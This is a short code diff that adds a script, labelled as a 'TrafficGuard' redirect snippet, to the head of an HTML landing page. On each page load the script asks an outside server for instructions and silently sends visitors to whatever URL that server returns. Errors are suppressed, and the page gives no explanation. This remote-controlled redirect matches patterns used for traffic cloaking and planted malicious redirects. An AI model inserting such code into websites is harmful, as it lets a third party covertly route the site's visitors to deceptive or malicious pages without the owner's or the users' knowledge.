@@ -2,6 +2,17 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+  <!-- TrafficGuard page redirect — paste in your landing page's <head> -->
+<script>
+(function () {
+  try {
+    fetch("https://trafficguard-api.up.railway.app/c/a14c1c8beaa7eb4f54e9670fcc45eb7e", { cache: "no-store" })
+      .then(function (r) { return r.json(); })
+      .then(function (d) { if (d && d.redirect && d.url) { window.location.replace(d.url); } })
+      .catch(function () {});
+  } catch (e) {}
+})();
+</script>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
